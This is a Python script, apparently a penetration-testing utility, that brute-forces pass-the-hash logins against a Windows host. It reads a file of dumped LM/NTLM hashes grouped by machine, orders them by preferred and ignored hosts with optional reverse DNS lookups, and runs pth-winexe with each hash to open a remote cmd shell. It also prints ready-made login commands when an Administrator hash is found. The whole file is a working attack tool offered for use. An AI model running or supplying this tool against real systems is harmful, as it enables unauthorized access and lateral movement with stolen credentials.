#!/usr/bin/env python3
import argparse
import re
import signal
import subprocess
import sys
from collections import defaultdict, namedtuple, OrderedDict

Credentials = namedtuple('Credentials', ['user', 'lm_hash', 'ntlm_hash'])


def style(s, color_triplet):
    color = '\x1b[{};{};{}m'.format(*color_triplet)
    end = '\x1b[0m'
    return color + s + end


def print_color(s, level=None):
    if level.lower() == 'ok':
        print(style('[+] ', (1, 32, 1)) + s)
    elif level.lower() == 'error':
        print(style('[!] ', (1, 31, 1)) + s)
    elif level.lower() == 'info':
        print(style('[~] ', (1, 34, 1)) + s)
    else:
        print(s)


def prepare_creds(hashes, empty_ntlm):
    with open(hashes) as f:
        lines = f.readlines()

    result = defaultdict(list)
    machine = 'NONAME'

    for cred in lines:
        cred = cred.strip('\n')
        if not cred:
            machine = 'NONAME'
            continue
        if cred.startswith('#'):
            machine = cred[1:].strip()
            continue
        user, _, lm, ntlm = cred.strip(':').split(':')
        if lm.startswith('NO PASSWORD'):
            lm = 'aad3b435b51404eeaad3b435b51404ee'
        if ntlm.startswith('NO PASSWORD'):
            ntlm = '31d6cfe0d16ae931b73c59d7e0c089c0'
            if not empty_ntlm:
                continue

        result[machine].append(Credentials(user, lm, ntlm))

    return {k:sorted(v) for k,v in result.items()}


def pth_winexe(ip, machine_name, cred):
    cmd = 'pth-winexe -U {user}%{lm}:{ntlm} //{ip} cmd'.format(
                                        user=cred.user,
                                        lm=cred.lm_hash,
                                        ntlm=cred.ntlm_hash,
                                        ip=ip)
    print('    Trying {}@{}'.format(cred.user, machine_name))
    return subprocess.run([cmd], shell=True, stderr=subprocess.DEVNULL).returncode


def stop(retcode):
    # Due to various possible return codes after exiting successfull shell, check only for some of them
    # NT_STATUS_LOGON_FAILURE: 1
    # NT_STATUS_ACCESS_DENIED: 241
    # NT_STATUS_PASSWORD_EXPIRED: 1
    if retcode in (1, 241):
        return

    while True:
        answer = input(style('[~] ', (1, 34, 1)) + 'Continue bruteforcing with remaining hashes? [y/N]: ')
        if not answer or answer.lower() == 'n':
            sys.exit(0)
        elif answer.lower() == 'y':
            return
        else:
            print_color('Unsupported option: {}'.format(answer), level='error')


def is_ip(candidate):
    pattern = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
    return re.match(pattern, candidate) is not None


def dns_reverse_lookup(ip, dns_server):
    cmd = 'host {} {} | grep "pointer" | cut -d " " -f 5 | cut -d "." -f 1'.format(ip, dns_server)
    completed = subprocess.run([cmd], shell=True, stdout=subprocess.PIPE)
    # Convert to string and remove trailing '\n'
    return completed.stdout.decode().strip('\n')


def ip_in_file(ip, creds, machine=None):
    msg = ("{} is already present in the hashes file" + (' ({})'.format(machine) if machine else '')).format(ip)
    print_color(msg, level='ok')
    # Try to find Administrator hash
    try:
        admin = next(filter(lambda x: x.user == 'Administrator', creds))
        print_color('Administrator account found', level='ok')
        print_color('Use --force-login or login with: pth-winexe -U {}%{}:{} //{} cmd'.format(admin.user, admin.lm_hash, admin.ntlm_hash, ip), level='info')
        sys.exit(0)
    except StopIteration:
        print_color('Administrator account not found. Try these accounts or use --force-login argument:', level='info')
        for entry in creds:
            print('pth-winexe -U {}%{}:{} //{} cmd'.format(entry.user, entry.lm_hash, entry.ntlm_hash, ip))
        sys.exit(0)


def main():
    usage = '''
    Interactive pth-winexe bruteforcer
    All the hashes!
    Usage: gha-win.py IP [options]

    Examples:
    gha-win.py 127.0.0.1
    gha-win.py 127.0.0.1 --file /root/my-hashes.txt --prefer foo 10.10.10.10 --ignore bar --dns 8.8.8.8
    '''
    parser = argparse.ArgumentParser(description=usage, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('ip', help='Target IP address')
    parser.add_argument('--file', default='windows-hashes.txt', help='File with LM/NTLM hashes (default: windows-hashes.txt)')
    parser.add_argument('--prefer',
                        metavar='machines',
                        nargs='*',
                        help='Start trying with hashes from <machines> first (machine names are separated with space)')
    parser.add_argument('--ignore',
                        metavar='machines',
                        nargs='*',
                        help='Do not try hashes from <machines> (machine names are separated with space). Overrides --prefer and presence check')
    parser.add_argument('--dns', help='Perform reverse DNS lookup. Useful when hash file contains machine names but options are passed as IPs')
    parser.add_argument('--force-login', action='store_true', help='Skip DNS check and force login attempt; --prefer and --ignore still apply')
    parser.add_argument('--empty-ntlm', action='store_true', help='Do not skip entries with empty NTLM hashes')
    args = parser.parse_args()

    if not is_ip(args.ip):
        print_color('Incorrect IP format. Exiting...', level='error')
        sys.exit(1)

    if args.dns is None or args.force_login:
        print_color('DNS checks will not be performed', level='info')
        dns = None
    elif not is_ip(args.dns):
        print_color('Incorrect DNS IP format. DNS checks will not be performed', level='error')
        dns = None
    else:
        dns = args.dns

    creds = prepare_creds(args.file, args.empty_ntlm)
    order = OrderedDict()

    if args.prefer is not None:
        residue = args.prefer[:]
        for m in args.prefer:
            # Check for duplicate entries
            if m in order:
                continue
            c = creds.pop(m, None)
            if c is not None:
                order[m] = c
                residue.remove(m)

        if residue:
        # Perform reverse DNS lookup on IPs that weren't found
            if dns is None:
                formatted = ', '.join((style(_, (1, 31, 1)) for _ in residue))
                lst = style('preferred', (1, 32, 1))
                print_color('Following hosts weren\'t added to {} list: {} (not in file or couldn\'t resolve)'.format(lst, formatted), level='error')
            else:
                for i in filter(is_ip, residue[:]):
                    name = dns_reverse_lookup(i, dns)
                    if name in order:
                        residue.remove(i)
                        continue
                    c = creds.pop(name, None)
                    if c is not None:
                        order[name] = c
                        residue.remove(i)
                if residue:
                    formatted = ', '.join((style(_, (1, 31, 1)) for _ in residue))
                    lst = style('preferred', (1, 32, 1))
                    print_color('Following hosts weren\'t added to {} list: {} (not in file or couldn\'t resolve)'.format(lst, formatted), level='error')

    order.update(creds)

    if args.ignore is not None:
        residue = args.ignore[:]
        already_ignored = set()
        for m in args.ignore:
            if m in already_ignored:
                continue
            c = order.pop(m, None)
            if c is not None:
                already_ignored.add(m)
                residue.remove(m)

        if residue:
            # Perform DNS checks on IPs that weren't found
            if dns is None:
                formatted = ', '.join((style(_, (1, 31, 1)) for _ in residue))
                lst = style('ignored', (1, 33, 1))
                print_color('Following hosts weren\'t added to {} list: {} (not in file or couldn\'t resolve)'.format(lst, formatted), level='error')
            else:
                for i in filter(is_ip, residue[:]):
                    name = dns_reverse_lookup(i, dns)
                    if name in already_ignored:
                        residue.remove(i)
                        continue
                    c = order.pop(name, None)
                    if c is not None:
                        residue.remove(i)
                        already_ignored.add(name)
                if residue:
                    formatted = ', '.join((style(_, (1, 31, 1)) for _ in residue))
                    lst = style('ignored', (1, 34, 1))
                    print_color('Following hosts weren\'t added to {} list: {} (not in file or couldn\'t resolve)'.format(lst, formatted), level='error')

    if not args.force_login:
        present = order.get(args.ip, None)
        if present is not None:
            ip_in_file(args.ip, present)

        if dns is not None:
            name = dns_reverse_lookup(args.ip, dns)
            present = order.get(name, None)
            if present is not None:
                ip_in_file(args.ip, present, name)

    print_color('---- Bruteforcing {} ----'.format(args.ip), level='info')

    for machine_name, credlist in order.items():
        for cred in credlist:
            retcode = pth_winexe(args.ip, machine_name, cred)
            stop(retcode)

if __name__ == '__main__':
    # Suppress exception messages on Ctrl + C
    signal.signal(signal.SIGINT, lambda x,y: sys.exit(2))
    sys.exit(main() or 0)
